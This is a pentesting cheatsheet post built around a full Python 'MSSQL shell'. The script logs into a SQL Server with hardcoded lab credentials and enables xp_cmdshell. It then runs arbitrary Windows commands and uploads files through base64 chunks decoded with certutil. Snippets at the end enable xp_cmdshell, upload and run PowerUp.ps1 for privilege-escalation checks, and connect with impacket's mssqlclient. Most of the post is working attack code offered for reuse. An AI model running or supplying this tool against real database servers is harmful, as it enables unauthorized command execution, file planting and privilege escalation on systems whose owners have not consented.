---
title: "MSSQL Shell Script with Autocomplete and Exploitation Cheatsheet"
date: 2025-02-18 12:00:00 +0700
categories: [Cheatsheets]
tags: [MSSQL, Pentesting, Red Teaming, Exploitation]
pin: false
---

# MSSQL Shell Script

## Acknowledgments
This script is based on the original work by **[Alamot](https://alamot.github.io/mssql_shell/)**. The original script was modified to:
- Fix compatibility issues related to `base64.encodestring` (which was removed in Python 3.9).
- Add **tab completion** for commands, file paths, and directory navigation.
- Enhance **usability** and **command history** using `readline`.
- Improve **error handling** and **stability**.

All credits for the initial implementation go to **Alamot**. This script is a modified version aimed at improving usability while maintaining the core functionality.

---

## MSSQL Shell Script
```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import shlex
import sys
import tqdm
import hashlib
import os
import readline  # Enables tab completion and command history

try:
    import _mssql
except ImportError:
    from pymssql import _mssql

# MSSQL Server Credentials
MSSQL_SERVER = "10.10.10.125"
MSSQL_USERNAME = "QUERIER\\mssql-svc"
MSSQL_PASSWORD = "corporate568"

BUFFER_SIZE = 5 * 1024
TIMEOUT = 30

# Common Windows commands for autocompletion
COMMON_COMMANDS = ["dir", "whoami", "tasklist", "net user", "systeminfo", "echo", "cls", "cd", "exit"]

def execute_query(mssql, query):
    """Executes an MSSQL query and fetches the results safely."""
    try:
        mssql.execute_query(query)
        return list(mssql)  # Ensure results are fetched
    except _mssql.MssqlDatabaseException as e:
        print(f"SQL Error: {e}")
        return []

def process_result(rows):
    """Processes query results and extracts useful info."""
    username, computername, cwd = "", "", ""
    
    for row in rows[:-3]:  # Print command output except last 3 rows
        output = row[list(row)[-1]] if row[list(row)[-1]] else ""
        print(output)

    if len(rows) >= 3:
        username, computername = rows[-3][list(rows[-3])[-1]].split('|')
        cwd = rows[-2][list(rows[-3])[-1]]

    return username.strip(), computername.strip(), cwd.strip()

def upload(mssql, stored_cwd, local_path, remote_path):
    """Uploads a file to the MSSQL server using Base64 encoding."""
    print(f"Uploading {local_path} to {remote_path}")
    execute_query(mssql, f"EXEC xp_cmdshell 'type nul > \"{remote_path}.b64\"'")

    try:
        with open(local_path, 'rb') as f:
            data = f.read()
            md5sum = hashlib.md5(data).hexdigest()
            b64enc_data = base64.b64encode(data).decode()
    except Exception as e:
        print(f"File error: {e}")
        return

    print(f"Data length (b64-encoded): {len(b64enc_data) / 1024:.2f} KB")

    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit="KB", unit_scale=BUFFER_SIZE / 1024):
        chunk = b64enc_data[i:i + BUFFER_SIZE]
        cmd = f'echo {chunk} >> "{remote_path}.b64"'
        execute_query(mssql, f"EXEC xp_cmdshell '{cmd}'")

    cmd = f'certutil -decode "{remote_path}.b64" "{remote_path}"'
    execute_query(mssql, f"EXEC xp_cmdshell 'cd {stored_cwd} & {cmd} & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(execute_query(mssql, "EXEC xp_cmdshell 'cd'"))

    cmd = f'certutil -hashfile "{remote_path}" MD5'
    hash_output = execute_query(mssql, f"EXEC xp_cmdshell 'cd {stored_cwd} & {cmd} & echo %username%^|%COMPUTERNAME% & cd'")
    
    if md5sum in [row[list(row)[-1]].strip() for row in hash_output if row[list(row)[-1]]]:
        print(f"MD5 hashes match: {md5sum}")
    else:
        print("ERROR! MD5 hashes do NOT match!")

def get_remote_files(mssql, stored_cwd):
    """Retrieves a list of files and directories from the remote system for tab completion."""
    remote_files = execute_query(mssql, f"EXEC xp_cmdshell 'dir /b {stored_cwd}'")
    return [row[list(row)[-1]].strip() for row in remote_files if row[list(row)[-1]]] if remote_files else []

def complete_command(text, state):
    """Tab completion for commands, local files, and remote directories."""
    buffer = readline.get_line_buffer().strip()
    args = buffer.split()

    if not args:
        return None

    if len(args) == 1:  # Autocomplete for commands
        options = [cmd for cmd in COMMON_COMMANDS if cmd.startswith(text)]
    elif args[0] == "cd":  # Autocomplete remote directories
        options = [d for d in get_remote_files(mssql_connection, stored_cwd) if d.lower().startswith(text.lower())]
    elif args[0] == "UPLOAD":  # Autocomplete local files
        prefix = text.strip()
        options = [f for f in os.listdir(".") if f.lower().startswith(prefix.lower())]
    else:  # Default to file/directory completion
        options = [f for f in get_remote_files(mssql_connection, stored_cwd) if f.lower().startswith(text.lower())]

    return options[state] if state < len(options) else None

def setup_readline():
    """Enables tab completion and command history."""
    readline.parse_and_bind("tab: complete")
    readline.set_completer(complete_command)
    history_file = os.path.expanduser("~/.mssql_shell_history")

    try:
        readline.read_history_file(history_file)
    except FileNotFoundError:
        pass
    
    import atexit
    atexit.register(readline.write_history_file, history_file)

def shell():
    """Main interactive shell function."""
    global mssql_connection, stored_cwd

    try:
        mssql_connection = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print(f"Successful login: {MSSQL_USERNAME}@{MSSQL_SERVER}")

        print("Enabling xp_cmdshell...")
        execute_query(mssql_connection, "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE")

        result = execute_query(mssql_connection, "EXEC xp_cmdshell 'echo %username%^|%COMPUTERNAME% & cd'")
        username, computername, stored_cwd = process_result(result)

        setup_readline()  # Enable tab completion and command history

        while True:
            cmd = input(f"CMD {username}@{computername} {stored_cwd}> ").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
            elif cmd.startswith("UPLOAD"):
                upload_cmd = shlex.split(cmd)
                if len(upload_cmd) < 3:
                    upload(mssql_connection, stored_cwd, upload_cmd[1], f"{stored_cwd}\\{upload_cmd[1]}")
                else:
                    upload(mssql_connection, stored_cwd, upload_cmd[1], upload_cmd[2])
                print("*** UPLOAD PROCEDURE FINISHED ***")
                continue

            result = execute_query(mssql_connection, f"EXEC xp_cmdshell 'cd {stored_cwd} & {cmd} & echo %username%^|%COMPUTERNAME% & cd'")
            username, computername, stored_cwd = process_result(result)

    except _mssql.MssqlDatabaseException as e:
        print(f"MSSQL Error: {e}")
    finally:
        if mssql_connection:
            mssql_connection.close()
        sys.exit()

if __name__ == "__main__":
    shell()

```

---

## MSSQL Command Execution Cheatsheet
### **Enable xp_cmdshell**
```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```
**Credit:** [Alamot](https://alamot.github.io/mssql_shell/)

### **File Upload & Execution**
```shell
UPLOAD PowerUp.ps1 C:\Users\Public\PowerUp.ps1
powershell -command "& { . .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII powerup_output.txt }"
```
**Credit:** [Alamot](https://alamot.github.io/mssql_shell/)

### **MSSQLClient Cheatsheet**
Connect to MSSQL server:
```bash
python3 /opt/impacket/examples/mssqlclient.py mssql-svc@10.10.10.125 -windows-auth
```

